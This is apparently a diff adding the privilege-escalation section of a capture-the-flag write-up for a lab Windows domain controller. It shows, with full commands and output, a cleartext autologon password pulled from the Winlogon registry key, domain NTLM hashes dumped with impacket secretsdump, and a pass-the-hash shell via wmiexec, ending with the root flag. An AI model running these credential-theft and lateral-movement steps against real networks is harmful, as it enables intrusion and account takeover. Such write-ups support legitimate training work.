@@ -221,3 +221,131 @@ PS C:\Users\FSmith\Documents> cat ..\Desktop\user.txt
 <br />
 
 
+I started going through a [windows local privilege escalation checklist](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation).  Looking at the registry, I found that automatic logon was enabled can contained a cleartext username and password: 
+```
+PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DefaultDomainName    REG_SZ    EGOTISTICALBANK
+    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ
+    LegalNoticeText    REG_SZ
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x303697c4
+    ShutdownFlags    REG_DWORD    0x13
+    DisableLockWorkstation    REG_DWORD    0x0
+    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
+
+```
+
+Now we have the credentials svc_loanmanager:Moneymakestheworldgoround!.  This looks to be the credentials for the svc_loanmgr account:
+```
+PS > net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+```
+
+<br /> 
+
+I checked out the permissions for this user to see if he had anything special:
+```
+PS C:\Users\svc_loanmgr\Documents> net user /domain svc_loanmgr
+
+User name                    svc_loanmgr
+Full Name                    L Manager
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/24/2020 4:48:31 PM
+Password expires             Never
+Password changeable          1/25/2020 4:48:31 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+<br />
+
+Looks like this user is a domain user.  We can now use the [impacket secretsdump.py script to remotely dump password hashes](https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633):
+```
+python secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
+
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
+[*] Cleaning up... 
+```
+
+<br />
+
+Since we have captured Adminstrator NTLM hashes, we can [pass-the-hash](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/#pth-toolkit-and-impacket) with impacket's wmiexec script:
+```
+python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175
+
+Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+```
+
+<br />
+
+And now with system level privileges we can access root.txt:
+```
+C:\Users\Administrator\Desktop>type root.txt
+
+f3ee04965c68257382e31502cc5e881f
+```
+
+
